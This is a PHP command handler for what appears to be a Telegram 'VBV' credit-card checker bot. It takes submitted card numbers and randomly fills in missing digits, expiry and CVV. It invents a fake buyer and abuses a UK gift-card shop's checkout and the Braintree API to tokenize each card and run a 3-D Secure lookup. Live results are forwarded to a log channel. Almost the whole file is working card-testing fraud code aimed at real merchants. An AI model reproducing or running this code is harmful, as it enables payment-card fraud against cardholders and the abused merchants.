<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


$time_start = microtime(true);
include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";
////////////====[MUTE]====////////////
if(strpos($message, "/vbv ") === 0 || strpos($message, "!vbv ") === 0 || strpos($message, ".vbv ") === 0){
    $antispam = antispamCheck($userId);
    $isPremium = get_prem_info($userId);
    addUser($userId);
    if ($antispam != False && $isPremium == "no"){
        bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id
        ]);
        return;

    }else {
        $messageidtoedit1 = bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' => "<b>Wait for Result...</b>",
            'parse_mode' => 'html',
            'reply_to_message_id' => $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 5);
        $separator = explode("|", $lista);
        $cc = $separator[0];
        $mm = $separator[1];
        $yy = $separator[2];
       $cvv = $separator[3];
       $inpt = $lista;

        if (strlen($cc) !== 16 ){
            $cc = str_replace(" ","",$cc);
            $cc = substr($cc, 0, 11). rand(11111, 99999);
        } if (strlen($mm) !== 2) {
            $mm = str_replace(" ","",$mm);
            $mm = $substr.rand(10,12);
        } if (strlen($yy) !== 4) {
            $yy = str_replace(" ","",$yy);
            $yy = rand(2023, 2024);
        }if(strlen($cvv) !== 3){
            $cvv = str_replace(" ","",$cvv);
            $cvv = rand(111,995);
        }
        if(strlen($cc)+strlen($mm)+strlen($yy)+strlen($cvv)==25){
            $lista = "$cc|$mm|$yy|$cvv";
        }
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
            $yy1 = substr($yy, 2, 2);
            $cbin = substr($cc, 0, 1);
            $bin = substr($cc, 0, 6);
            if ($cbin == 5){
                $ctype = 'Mastercard    ';
            } else if ($cbin == 4){
                $ctype = 'Visa';
            }
            $retries = 0;
            ###CHECKER PART###
            $info = json_decode(random_info(),true);
            $fname = $info['fname'];
            $lname = $info['lname'];
            $email = $info['email'];
            $street = $info['street'];
            $city = $info['city'];
            $state = $info['state'];
            $phone = $info['phone'];
            $postcode = $info['postcode'];
            $binlist = json_decode(fbankinfo($bin),true);
            $ccbank = $binlist['Bank'];
            $ccvendor = $binlist['Vendor'];
            $cctype = $binlist['Bank_Info'];
            $cc_country = $binlist['Country'];
            $abn = $binlist['Abn'];
            $cc_emoji = $binlist['emoji'];
            $cookie = RandomString();

            /////////////////////==========[Unavailable if empty]==========////////////////

//             $page =  cURL(
//                 "https://meandmygolf.com/coaching-plans/",
//                 $headers = [
//                     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
//                     'content-type: application/x-www-form-urlencoded',
//                     'referer: https://meandmygolf.com/coaching-plans/',
//                     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44'
//                 ],
//                 "coaching_plan_product_id=331743",
//                 "POST",
//                 1,
//                 $cookie
//             );
// //       $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

//             $checkout =  cURL(
//                 "https://meandmygolf.com/checkout/",
//                 $headers = [
//                     "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
//                     "referer: https://meandmygolf.com/coaching-plans/",
//                     "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44"
//                 ],
//                 "",
//                 "GET",
//                 1,
//                 $cookie
//             ); $data = json_decode(base64_decode(GetStr($checkout, 'wc_braintree_client_token = ["', '"')), true);
            $checkout =  cURL(
                "https://api2.mytoggle.io/graphql",
                $headers = [
                    'Accept: application/json, text/plain, */*',
				'Content-Type: application/json',
				'Origin: https://giftcardshop.shepherdneame.co.uk',
				'Referer: https://giftcardshop.shepherdneame.co.uk/',
				'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44',
				'X-App-Version: {"version_increment":"2.22","refresh_local_cache_increment":8,"api_version":"3.10","app_id":1}'
                ],
                '{"query":"\\n\\t                  mutation (\\n\\t                        $id:Int,\\n\\t                        $hash:String,\\n\\t                        $account_id:Int!,\\n\\t                        $order_items:[OrderItemInput]!,\\n\\t                        $currency:String!,\\n\\t                        $group_fulfilment:Boolean!,\\n\\t                        $group_fulfilment_address:AddressInput,\\n\\t                        $group_fulfilment_email:String,\\n\\t                        $group_fulfilment_postage_category_id:Int,\\n\\t                        $total:Int!,\\n\\t                        $receipt_contact:ContactInput!,\\n\\t                        $billing_address:AddressInput!,\\n\\t                        $consents:[ConsentInput],\\n\\t                        $discounts:[DiscountInput],\\n\\t                        $giftcard_payments:[GiftCardInput],\\n\\t                        $finalise:Boolean,\\n\\t                        $charge_giftcards:Boolean\\n\\t                      ){\\n\\t                        createPendingOrder(\\n\\t                            id                                  : $id,\\n\\t                            hash                                : $hash,\\n\\t                            account_id                          : $account_id,\\n\\t                            order_items                         : $order_items,\\n\\t                            currency                            : $currency,\\n\\t                            receipt_contact                     : $receipt_contact,\\n\\t                            group_fulfilment                    : $group_fulfilment,\\n\\t                            group_fulfilment_address            : $group_fulfilment_address,\\n\\t                            group_fulfilment_email              : $group_fulfilment_email,\\n\\t                            group_fulfilment_postage_category_id: $group_fulfilment_postage_category_id,\\n\\t                            total                               : $total,\\n\\t                            billing_address                     : $billing_address,\\n\\t                            consents                            : $consents,\\n\\t                            discounts                           : $discounts\\n\\t                            giftcard_payments                   : $giftcard_payments,\\n\\t                            finalise                            : $finalise\\n\\t                            charge_giftcards                    : $charge_giftcards\\n\\t                        ){id, merchant_client_attributes, remaining_balance, balance_paid, hash}\\n\\t                  }\\n\\t                ","variables":{"total":1325,"currency":"GBP","order_items":[{"product_id":4695,"price_modifier_id":16531,"custom_price_modifier_value":null,"message":"","fulfilment_method_id":2}],"group_fulfilment":true,"group_fulfilment_address":{"name":"July Kalat","address_line_1":"Central Ave","address_line_2":"dsadas","town_city":"Los Angeles","postcode":"BL1 1AR","country_code":""},"group_fulfilment_postage_category_id":584,"account_id":662,"receipt_contact":{"email":"docugs030401@aol.com","first_name":"July","last_name":"Kalat","phone_number":""},"billing_address":{"name":"July Kalat","address_line_1":"Central Ave","town_city":"Los Angeles","postcode":"90001"},"consents":[{"id":295,"consent_copy":"We\'d love to send you exclusive offers and the latest info from Shepherd Neame by email, mobile communications and other electronic means. We\'ll always treat your personal details with care and will never sell them to other companies for marketing purposes. Please let us know if you would like us to contact you or not by selecting one of the options.","is_active":1,"optin":0}],"finalise":false,"charge_giftcards":true,"id":450023,"hash":"ZTJjN2VlMDExOTZlZmNmYWFlYTM4MjhjMjNhYjk0ZjBiZDZiYTg3ZA=="}}',
                "POST",
                1,
                $cookie
            ); $data = json_decode(base64_decode(GetStr($checkout, '{\"client_token\":\"', '"')), true);    
           
       //     $refId = "0_cb63e3a1-2622-4209-a8cd-2d00140a2cc1";
       //     file_get_contents("https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c897142adb1562e00388ba4&tmEventType=PAYMENT&referenceId=$refId&geolocation=false&origin=Songbird");
          
    
            $fprint = $data['authorizationFingerprint'];
            $graphql = cURL(
                "https://payments.braintree-api.com/graphql",
                $headers = [
                    "Accept: */*",
                    "Authorization: Bearer $fprint",
                    "Braintree-Version: 2018-05-10",
                    "Content-Type: application/json",
                    "Origin: https://assets.braintreegateway.com",
                    "Referer: https://assets.braintreegateway.com/",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44"
                ],
                '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
                "POST",
                1,
                $cookie
            );
            $token = GetStr($graphql, '"token":"','"');
             $lookup = cURL(
                "https://api.braintreegateway.com/merchants/zqzj5ttzj767333d/client_api/v1/payment_methods/$token/three_d_secure/lookup",
                $headers = [
                    'Accept: */*',
                    'Accept-Language: en-US,en;q=0.9,mt;q=0.8',
                    'Cache-Control: no-cache',
                    'Connection: keep-alive',
                    'Content-Type: application/json',
                    'Origin: https://giftcardshop.shepherdneame.co.uk/',
                    'Pragma: no-cache',
                    'Referer: https://giftcardshop.shepherdneame.co.uk/payment/',
                    'Sec-Fetch-Dest: empty',
                    'Sec-Fetch-Mode: cors',
                    'Sec-Fetch-Site: cross-site',
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 Edg/103.0.1264.44",
                    'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
                    'sec-ch-ua-mobile: ?0',
                    'sec-ch-ua-platform: "Windows"'
                ],
                '{"amount":13.25,"additionalInfo":{"billingLine1":"Central Ave","billingCity":"Los Angeles","billingPostalCode":"90001","billingPhoneNumber":"","billingGivenName":"July","billingSurname":"Kalat","email":"docugs030401@aol.com"},"bin":"'.$cbin.'","dfReferenceId":"0_0a756b00-186c-4f48-bc56-500b53cdadb0","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.76.2","cardinalDeviceDataCollectionTimeElapsed":11649,"issuerDeviceDataCollectionTimeElapsed":903,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$fprint.'","braintreeLibraryVersion":"braintree/web/3.76.2","_meta":{"merchantAppId":"giftcardshop.shepherdneame.co.uk","platform":"web","sdkVersion":"3.76.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$str.'"}}',
                "POST",
                1,
                $cookie
            );
            $status = GetStr($lookup, '"status":"','"');$time = number_format(microtime(true) - $time_start, 2);
            $bank = GetStr($lookup, 'issuingBank":"','"');$issuedCountry = GetStr($lookup, 'countryOfIssuance":"','"');
            $prepaid = GetStr($lookup, 'prepaid":"','"');$healthcare = GetStr($lookup, 'healthcare":"','"');
            $debit = GetStr($lookup, 'debit":"','"');$regulated = GetStr($lookup, 'durbinRegulated":"','"');
            $commercial = GetStr($lookup, 'commercial":"','"');$payroll = GetStr($lookup, 'payroll":"','"');
            $liabilityShifted = GetStr($lookup, 'liabilityShifted":','"');$liabilityShiftedPossible = GetStr($lookup, 'liabilityShiftPossible":','"');
            $threeD_url = GetStr($lookup, 'acsUrl":"','"');
            $eci_flag = GetStr($lookup, 'eciFlag":"','"');
            ###END OF CHECKER PART###
            $status = str_replace('_',' ',$status);

            if(strpos($lookup, 'lookup_not_enrolled') || strpos($lookup, 'authenticate_successful') || strpos($lookup, 'authentication_unavailable') ||strpos($lookup, 'authenticate_attempt_successful')) {
                addTotal();
                addUserTotal($userId);
                addCVV();
                addUserCVV($userId);
                addCCN();
                addUserCCN($userId);
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>".strtoupper($status)." ✅
<b>Card -»</b> <code>$inpt</code>
<b>Took -»</b> <b>$time</b><b>s</b>
<b>Gateway -» ThreeD Lookup</b>
<b>------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country ($abn) $cc_emoji</b>

<b>--ThreeD SECURE INFO--</b>
<b>Prepaid -»</b> $prepaid
<b>Healthcare -»</b> $healthcare
<b>Debit -»</b> $debit
<b>Regulated -»</b> $regulated
<b>Commercial -»</b> $commercial
<b>Payroll -»</b> $payroll
<b>ThreeD Url -»</b> <b>$threeD_url</b>
<b>eciFlag -»</b> $eci_flag
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'

                ]);copyLogs("@payamansoyvbv",$chat_id,$messageidtoedit);


            }
            else {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>".strtoupper($status)." ❌
<b>Card -»</b> <code>$inpt</code>
<b>Took -»</b> <b>$time</b><b>s</b>
<b>Gateway -» ThreeD Lookup</b>
<b>------- Bin Info -------</b>
<b>Bank -»</b> $ccbank
<b>Brand -»</b> $ccvendor
<b>Type -»</b> $cctype
<b>Country -»</b> $cc_country ($abn) $cc_emoji</b>

<b>--ThreeD SECURE INFO--</b>
<b>Prepaid -»</b> $prepaid
<b>Healthcare -»</b> $healthcare
<b>Debit -»</b> $debit
<b>Regulated -»</b> $regulated
<b>Commercial -»</b> $commercial
<b>Payroll -»</b> $payroll
<b>ThreeD Url -»</b> <b>$threeD_url</b>
<b>eciFlag -»</b> $eci_flag
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'

                ]);}


        }else{
            bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<code>$inpt</code><b>
INVALID FORMAT -(cmd) XXXXXXXXXXXXXXXXXX|XX|XXXX|XXX</b>",
                'parse_mode'=>'html', 'disable_web_page_preview'=>'true'

            ]);}
    }







}


?>
